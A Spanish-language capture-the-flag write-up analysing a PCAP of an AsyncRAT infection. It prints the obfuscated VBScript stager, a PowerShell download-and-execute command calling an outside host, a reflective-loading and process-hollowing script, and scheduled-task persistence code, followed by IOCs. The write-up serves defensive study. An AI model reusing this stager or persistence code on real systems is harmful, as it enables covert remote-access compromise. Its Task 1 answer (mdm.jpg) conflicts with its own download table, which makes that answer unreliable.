![[XLMRat-0.png]]

## Introduction

El reto **XLMRat** de **CyberDefenders** presenta un caso de estudio avanzado sobre la cadena de infección de un **RAT (Remote Access Trojan)** que prioriza el sigilo mediante técnicas de evasión de defensas. El análisis no se limita a la identificación de indicadores básicos (IOCs), sino que exige una inmersión profunda en la **memoria del proceso** y el **tráfico de red** para comprender cómo el malware evade soluciones de seguridad convencionales.

El incidente comienza con un _stager_ inicial que utiliza **ofuscación por fragmentación** en VBScript para descargar un segundo payload bajo una extensión falsa (`.jpg`). Este segundo componente orquesta una carga **fileless** (sin rastro en disco) mediante **Reflective Code Loading**, utilizando la API de reflexión de .NET para inyectar el ejecutable final en procesos legítimos de Windows.

~~~txt
Platform: CyberDefenders
Level: Easy
Category: Network Forensics
Tactics: Execution, Defense Evasion
~~~


## Scenario

> A compromised machine has been flagged due to suspicious network traffic. Your task is to analyze the PCAP file to determine the attack method, identify any malicious payloads, and trace the timeline of events. Focus on how the attacker gained access, what tools or techniques were used, and how the malware operated post-compromise.


## Task #1

> _"The attacker successfully executed a command to download the first stage of the malware. What is the URL from which the first malware stage was installed?"_

Esto significa que: un comando fue ejecutado en el host víctima, el cual realizó una descarga, probablemente vía HTTP (método GET), desde una IP externa y con respuesta `200 OK` (transferencia exitosa).

![[xmlrat-1.png]]

---

#### Análisis del tráfico HTTP

En primer lugar se observa el tráfico HTTP:

- **¿Hay tráfico HTTP externo?** Sí. Se confirma al filtrar el tráfico y observar el protocolo HTTP: el recurso solicitado (`/xlm.txt`) se está pidiendo a una dirección que no pertenece a la red local del host.
- **¿Quién inicia la conexión?** La dirección IP `10.1.9.101` (la máquina comprometida).
- **¿Hay requests hacia IPs públicas?** Sí. La petición se realiza hacia la IP `45.126.209.4` (la máquina del atacante).

![[XMLrat-2.png]]

En el modelo cliente-servidor de HTTP, quien envía el método `GET` es quien inicia la solicitud de datos:

|Rol|Dirección IP|Tipo|
|---|---|---|
|Cliente|`10.1.9.101`|Privada|
|Servidor|`45.126.209.4`|Pública|

Cualquier comunicación que salga de un rango privado (`10.x.x.x`, `192.168.x.x`, `172.16.x.x`) hacia una IP fuera de esos rangos se considera tráfico externo o hacia Internet.

---

#### Archivos descargados

Mediante `Export Objects → HTTP` se observa que desde el hostname `45.126.209.4:222` únicamente fueron descargados dos archivos: `xlm.txt` y `mdm.jpg`. 

![[XLMRat-4.png]]

| Paquete | Origen (Iniciador) | Destino        | Acción             | Archivo             |
| ------- | ------------------ | -------------- | ------------------ | ------------------- |
| 4       | `10.1.9.101`       | `45.126.209.4` | GET (Petición)     | `xlm.txt`           |
| 7       | `45.126.209.4`     | `10.1.9.101`   | 200 OK (Respuesta) | (Contenido enviado) |
| 12      | `10.1.9.101`       | `45.126.209.4` | GET (Petición)     | `mdm.jpg`           |

En base a lo anterior, es posible confirmar la URL de la primera etapa del malware:

```
http://45.126.209.4:222/mdm.jpg
```

---

## Task #2

> _"Which hosting provider owns the associated IP address?"_

Al analizar la IP pública en [AbuseIPDB](https://www.abuseipdb.com/check/45.126.209.4), el ASN y el proveedor de infraestructura asociado a la IP `45.126.209.4` corresponde al dominio `reliablesite.net`.

![[XLMRat-3 1.png]]

---

## Task #3

> _"By analyzing the malicious scripts, two payloads were identified: a loader and a secondary executable. What is the SHA256 of the malware executable?"_

#### Primera etapa: `xlm.txt` — VBScript ofuscado

Al realizar `Follow --> HTTP Stream` sobre el tráfico de `xlm.txt`, se observa que, aunque el servidor lo entrega con `Content-Type: text/plain`, el contenido real es un script **VBScript** diseñado para evadir detecciones estáticas mediante una técnica de fragmentación de strings.

#### Follow HTTP Stream sobre `xlm.txt`

~~~VBScript
GET /xlm.txt HTTP/1.1
Accept: */*
UA-CPU: AMD64
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)
Host: 45.126.209.4:222  # <------------ HOST atacante.
Connection: Keep-Alive


HTTP/1.1 200 OK
Date: Tue, 09 Jan 2024 17:27:28 GMT
Server: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
Last-Modified: Fri, 05 Jan 2024 10:28:14 GMT
ETag: "7b6-60e304e3f0e63"
Accept-Ranges: bytes
Content-Length: 1974
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/plain

Dim LZeWX(88), OodjR, i

' Define each part based on the provided order
LZeWX(0) = "[B"
LZeWX(1) = "YT"
LZeWX(2) = "e["
LZeWX(3) = "]]"
LZeWX(4) = ";$"
LZeWX(5) = "A1"
LZeWX(6) = "23"
LZeWX(7) = "='"
LZeWX(8) = "Ie"
LZeWX(9) = "X("
LZeWX(10) = "Ne"
LZeWX(11) = "W-"
LZeWX(12) = "OB"
LZeWX(13) = "Je"
LZeWX(14) = "CT"
LZeWX(15) = " N"
LZeWX(16) = "eT"
LZeWX(17) = ".W"
LZeWX(18) = "';"
LZeWX(19) = "$B"
LZeWX(20) = "45"
LZeWX(21) = "6="
LZeWX(22) = "'e"
LZeWX(23) = "BC"
LZeWX(24) = "LI"
LZeWX(25) = "eN"
LZeWX(26) = "T)"
LZeWX(27) = ".D"
LZeWX(28) = "OW"
LZeWX(29) = "NL"
LZeWX(30) = "O'"
LZeWX(31) = ";["
LZeWX(32) = "BY"
LZeWX(33) = "Te"
LZeWX(34) = "[]"
LZeWX(35) = "];"
LZeWX(36) = "$C"
LZeWX(37) = "78"
LZeWX(38) = "9="
LZeWX(39) = "'V"
LZeWX(40) = "AN"
LZeWX(41) = "('"
LZeWX(42) = "'h"
LZeWX(43) = "tt"
LZeWX(44) = "p:"
LZeWX(45) = "//"
LZeWX(46) = "45"
LZeWX(47) = ".1"
LZeWX(48) = "26"
LZeWX(49) = ".2"
LZeWX(50) = "09"
LZeWX(51) = ".4"
LZeWX(52) = ":2"
LZeWX(53) = "22/m"
LZeWX(54) = "dm"
LZeWX(55) = ".j"
LZeWX(56) = "pg"
LZeWX(57) = "''"
LZeWX(58) = ")'"
LZeWX(59) = ".R"
LZeWX(60) = "eP"
LZeWX(61) = "LA"
LZeWX(62) = "Ce"
LZeWX(63) = "('"
LZeWX(64) = "VA"
LZeWX(65) = "N'"
LZeWX(66) = ",'"
LZeWX(67) = "AD"
LZeWX(68) = "ST"
LZeWX(69) = "RI"
LZeWX(70) = "NG"
LZeWX(71) = "')"
LZeWX(72) = ";["
LZeWX(73) = "BY"
LZeWX(74) = "Te"
LZeWX(75) = "[]"
LZeWX(76) = "];"
LZeWX(77) = "Ie"
LZeWX(78) = "X("
LZeWX(79) = "$A"
LZeWX(80) = "12"
LZeWX(81) = "3+"
LZeWX(82) = "$B"
LZeWX(83) = "45"
LZeWX(84) = "6+"
LZeWX(85) = "$C"
LZeWX(86) = "78"
LZeWX(87) = "9)"

' Combine the parts into one string
OodjR = ""
For i = 0 To 88 - 1
    OodjR = OodjR & LZeWX(i)
Next

' Use the combinedParts in the shell execution
Set objShell = CreateObject("WScript.Shell")
objShell.Run "Cmd.exe /c POWeRSHeLL.eXe -NOP -WIND HIDDeN -eXeC BYPASS -NONI " & OodjR, 0, True
Set objShell = Nothing
~~~

#### Técnicas de evasión identificadas

- **Ofuscación por fragmentación**: El script define un array `LZeWX(88)` donde cada índice contiene solo 2 o 3 caracteres. Esto impide que los motores antivirus (AV) encuentren firmas de comandos conocidos como `New-Object` o `DownloadString` en una sola línea.
- **Vector de ejecución en cadena**: Utiliza `WScript.Shell` para invocar `Cmd.exe`, el cual a su vez invoca `PowerShell.exe`.
- **Flags de evasión de PowerShell**:
    - `-NOP` — Ignora perfiles de usuario.
    - `-WIND HIDDEN` — Oculta la ventana de consola.
    - `-eXeC BYPASS` — Omite la política de restricción de scripts de Windows.

#### Comando resultante tras desofuscar el bucle `For`

```powershell
POWeRSHeLL.eXe -NOP -WIND HIDDeN -eXeC BYPASS -NONI [Byte[]];$A123='IEX(NeW-OBJeCT NeT.WebClient).DownloadString(''http://45.126.209.4:222/mdm.jpg'').REPLACE(''VAN'',''ADSTRING'')';IEX($A123)
```

> **Nota:** La capitalización irregular (`WBeCLIeNT`, `DOWBLOADSTRING`, etc.) es **intencional por parte del atacante** como técnica adicional de evasión de firmas basadas en strings. Los nombres de clase y método en .NET son case-insensitive, por lo que el código funciona independientemente de las mayúsculas.

---

#### Segunda etapa: `mdm.jpg` — PowerShell con carga fileless

Al realizar `Follow --> HTTP Stream` sobre el tráfico que contiene `mdm.jpg` se confirma que el archivo **no es una imagen**: es un script de **PowerShell** que orquesta una carga completamente en memoria (_fileless_) de dos binarios embebidos.

#### Follow HTTP Stream sobre `mdm.jpg`

~~~VBScript
GET /mdm.jpg HTTP/1.1
Host: 45.126.209.4:222
Connection: Keep-Alive
HTTP/1.1 200 OK
Date: Tue, 09 Jan 2024 17:27:29 GMT
Server: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
Last-Modified: Fri, 05 Jan 2024 12:07:33 GMT
ETag: "69468-60e31b1792a41"
Accept-Ranges: bytes
Content-Length: 431208
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: image/jpeg

...$Content = @'

$hexString_bbb = "4D_5A_90_00_03_...(mucho hexadecimal)_00_00"
$hexString_pe = "4D_5A_90_00_03_...(mucho hexadecimal)_00_00"

Sleep 5

[Byte[]] $NKbb = $hexString_bbb -split '_' | ForEach-Object { [byte]([convert]::ToInt32($_, 16)) }
[Byte[]] $pe = $hexString_pe -split '_' | ForEach-Object { [byte]([convert]::ToInt32($_, 16)) }

Sleep 5

$HM = 'L###############o################a#d' -replace '#', ''
$Fu = [Reflection.Assembly]::$HM($pe)

$NK = $Fu.GetType('N#ew#PE#2.P#E'-replace '#', '')
$MZ = $NK.GetMethod('Execute')
$NA = 'C:\W#######indow############s\Mi####cr'-replace '#', ''
$AC = $NA + 'osof#####t.NET\Fra###mework\v4.0.303###19\R##egSvc#####s.exe'-replace '#', ''
$VA = @($AC, $NKbb)

$CM = 'In#################vo################ke'-replace '#', ''
$EY = $MZ.$CM($null, [object[]] $VA)

'@
[IO.File]::WriteAllText("C:\Users\Public\Conted.ps1", $Content)  

$Content = @'
@e%Conted%%Conted% off
set "ps=powershell.exe"
set "Contedms=-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass"
set "cmd=C:\Users\Public\Conted.ps1"
%ps% %Contedms% -Command "& '%cmd%'"
exit /b

'@
[IO.File]::WriteAllText("C:\Users\Public\Conted.bat", $Content)

$Content = @'
on error resume next
Function CreateWshShellObj()
	Dim objName
	objName = "WScript.Shell"
	Set CreateWshShellObj = CreateObject(objName)
End Function

Function GetFilePath()
	Dim filePath
	filePath = "C:\Users\Public\Conted.bat"
	GetFilePath = filePath
End Function

Function GetVisibilitySetting()
	Dim visibility
	visibility = 0
	GetVisibilitySetting = visibility
End Function

Function RunFile(wshShellObj, filePath, visibility)
	wshShellObj.Run filePath, visibility
End Function

Set wshShellObj = CreateWshShellObj()
filePath = GetFilePath()
visibility = GetVisibilitySetting()
Call RunFile(wshShellObj, filePath, visibility)

'@
[IO.File]::WriteAllText("C:\Users\Public\Conted.vbs", $Content)

Sleep 2

$scheduler = New-Object -ComObject Schedule.Service
$scheduler.Connect()

$taskDefinition = $scheduler.NewTask(0)
$taskDefinition.RegistrationInfo.Description = "Runs a script every 2 minutes"
$taskDefinition.Settings.Enabled = $true
$taskDefinition.Settings.DisallowStartIfOnBatteries = $false
$trigger = $taskDefinition.Triggers.Create(1) # 1 = TimeTrigger
$trigger.StartBoundary = [DateTime]::Now.ToString("yyyy-MM-ddTHH:mm:ss")
$trigger.Repetition.Interval = "PT2M"

# .......... ...... Action
$action = $taskDefinition.Actions.Create(0) # 0 = ExecAction
$action.Path = "C:\Users\Public\Conted.vbs"

$taskFolder = $scheduler.GetFolder("\")
$taskFolder.RegisterTaskDefinition("Update Edge", $taskDefinition, 6, $null, $null, 3)
~~~

#### Indicadores de ejecutables embebidos

Tanto la variable `$hexString_bbb` como `$hexString_pe` comienzan con los bytes `4D 5A`, que en ASCII es la secuencia **MZ**: la firma universal (_magic bytes_) de cualquier archivo ejecutable PE (Portable Executable) de Windows, ya sea `.exe` o `.dll`.

#### Rol de cada payload

|Variable|Tipo|Rol|
|---|---|---|
|`$hexString_pe`|.NET DLL|**Loader** — Contiene la clase `NewPE2.PE` y el método `Execute`. Se encarga de realizar el Process Hollowing.|
|`$hexString_bbb`|.NET EXE|**Malware final** — Payload de espionaje inyectado en el proceso víctima.|

> **Nota:** `NewPE2.PE` es un loader de Process Hollowing públicamente conocido, con repositorios disponibles en GitHub. Su identificación puede utilizarse como punto de partida en búsquedas de inteligencia de amenazas (threat intel) y atribución.

#### Técnica de carga en memoria (fileless)

```powershell
[Byte[]] $NKbb = $hexString_bbb -split '_' | ForEach-Object { [byte]([convert]::ToInt32($_, 16)) }
[Byte[]] $pe   = $hexString_pe  -split '_' | ForEach-Object { [byte]([convert]::ToInt32($_, 16)) }

$Fu = [Reflection.Assembly]::Load($pe)
```

`[Reflection.Assembly]::Load()` es una función legítima de .NET que permite cargar una DLL directamente desde un array de bytes en RAM, sin que el binario toque el disco en ningún momento. Una vez cargado, el script resuelve el método `Execute` mediante reflexión y lo invoca. Esta técnica es conocida como **Reflecting Code Loading**. 

- **Nota**: Reflecting Code Loading es el término técnico exacto para cargar binarios en memoria evitando el escaneo de archivos en disco (On-access scanning).

#### SHA256 del Malware Executable

Es posible analizar el hash **SHA256** con el fin de obtener información detallada del malware ejecutable. En este caso se utiliza un script en PowerShell para convertir la linea `$hexString_bbb = "4D_5A_90_00_03_..."` de hexadecimal a binario: 

~~~PowerShell
$hexString_bbb = "4D_5A_90_00_03_00_00_00_04_00_...(el hexadecimal completo)"
$bytes = $hexString_bbb -split '_' | ForEach-Object { [byte]([convert]::ToInt32($_, 16)) }
[IO.File]::WriteAllBytes("payload.exe", $bytes)
~~~

El script genera un ejecutable `payload.exe` el cuál es posible obtener su hash mediante el comando de PowerShell `Get-FileHash [Path] -Algorithm SHA256`

![[Pasted image 20260302165000.png]]

> **Nota**: SHA256 es el identificador criptográfico inmutable de un artefacto digital, como la "huella digital" exacta del ejecutable.

---
## Task #4

> What is the malware family label based on Alibaba?

Se analiza el hash en [VirusTotal](https://www.virustotal.com/gui) y se detalla que la familia del malware según Alibaba es **AsynRat**, un tipo de malware catalogado como **RAT (Remote Access Troyan)**. Están diseñados para permitir el control total de una computadora de forma remota, generalmente sin que la victima se dé cuenta. 

![[XLMRat-6.png]]

---
## Task #5 

> What is the timestamp of the malware's creation?

En `Details` se detalla la fecha de creación del **RAT** `Creation Time   2023-10-30 15:08:44 UTC`

![[XLMRat-7.png]]


---
## Task #6

> Which LOLBin is leveraged for stealthy process execution in this script? Provide the full path.

En el script `mdm.jpg` es posible visualizar ofuscación con el objetivo de esconder un path para que no sea fácilmente detectable por antivirus (AV) o analistas. Al desofuscar la linea se consigue el path: `C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe` 

~~~VBScript
$NA = 'C:\W#######indow############s\Mi####cr'-replace '#', ''
$AC = $NA + 'osof#####t.NET\Fra###mework\v4.0.303###19\R##egSvc#####s.exe'-replace '#', ''
$VA = @($AC, $NKbb)
~~~

El loader (`$hexString_pe`) realiza **Process Hollowing**. Toma como objetivo el **LOLBin** `RegSvcs.exe`, una herramienta legítima del framework .NET de Microsoft:

1. Inicia `RegSvcs.exe` en **estado suspendido**.
2. **Vacía su memoria** original (_hollowing_).
3. **Inyecta** el payload `$hexString_bbb` en el espacio de memoria resultante.
4. **Reanuda** el proceso.

Para el Administrador de Tareas y para herramientas de monitoreo superficial, el proceso aparece como `RegSvcs.exe` ejecutándose con normalidad. En realidad, el código que corre internamente es el malware.

> **Nota**: un LOLBin (Living-off-the-Land Binary) es un archivo firmado digitalmente por Microsoft. RegSvcs.exe Es una herramienta oficial de Microsoft que viene preinstalada con el .NET Framework.

> **Nota**: El Process Hollowing (o "vaciado de proceso") es una técnica de inyección de código que utilizan los atacantes para ocultar malware dentro de un proceso legítimo que ya está corriendo en Windows.

## Task #7

 > The script is designed to drop several files. List the names of the files dropped by the script.

Aunque la ejecución inicial es fileless, el script establece un mecanismo de **persistencia que sí toca el disco**. Los dos conceptos no se contradicen: el binario malicioso nunca se escribe como `.exe` en el sistema, pero los lanzadores que garantizan su re-ejecución sí se almacenan.

Se generan tres archivos en `C:\Users\Public\`:

|Archivo|Tipo|Función|
|---|---|---|
|`Conted.ps1`|PowerShell|Contiene los hex strings completos y la lógica de inyección.|
|`Conted.bat`|Batch|Lanzador que ejecuta `Conted.ps1` con los flags de bypass.|
|`Conted.vbs`|VBScript|Ejecuta `Conted.bat` con `visibility = 0`, sin ventana visible para el usuario.|

Adicionalmente, se programa una tarea en el **Task Scheduler** llamada `"Update Edge"`, configurada para dispararse **cada 2 minutos**:

```powershell
$trigger.Repetition.Interval = "PT2M"
$action.Path = "C:\Users\Public\Conted.vbs"
$taskFolder.RegisterTaskDefinition("Update Edge", $taskDefinition, 6, $null, $null, 3)
```

El nombre `"Update Edge"` El nombre `Update Edge` es una técnica de **masquerading (MITRE ATT&CK T1036)**: imitar nombres de procesos o tareas legítimas para pasar desapercibido.

---

### Attack Chain Review

```
WScript (xlm.txt)
    └── Cmd.exe
        └── PowerShell.exe (IEX)
            └── Descarga mdm.jpg desde 45.126.209.4:222
                └── Convierte hex strings → arrays de bytes en RAM
                    ├── Carga loader DLL ($hexString_pe) via Reflection.Assembly::Load()
                    │       └── NewPE2.PE::Execute()
                    │               └── Process Hollowing sobre RegSvcs.exe
                    │                       └── Inyecta malware ($hexString_bbb)
                    └── Escribe Conted.ps1 / .bat / .vbs en C:\Users\Public\
                            └── Task Scheduler: "Update Edge" cada 2 minutos
```

--- 

#### IOCs (Indicators Of Compromise)

| **Tipo**    | **Valor**                                                          | **Descripción**                    |
| ----------- | ------------------------------------------------------------------ | ---------------------------------- |
| **IPv4**    | `45.126.209.4`                                                     | C2 / Hosting de Malware (Port 222) |
| **URL**     | `http://45.126.209.4:222/xlm.txt`                                  | Stager inicial (VBS)               |
| **URL**     | `http://45.126.209.4:222/mdm.jpg`                                  | Payload (PowerShell + Binarios)    |
| **Archivo** | `C:\Users\Public\Conted.vbs`                                       | Script de persistencia             |
| **Tarea**   | `Update Edge`                                                      | Tarea programada maliciosa         |
| **SHA256**  | _1EB7B02E18F67420F42B1D94E74F3B6289D92672A0FB1786C30C03D68E81D798_ | Ejecutable final de AsyncRAT       |
| **Archivo** | `C:\Users\Public\Conted.bat`                                       | Script de Persistencia             |
| **Archivo** | `C:\Users\Public\Conted.ps1`                                       | Script de Persistencia             |
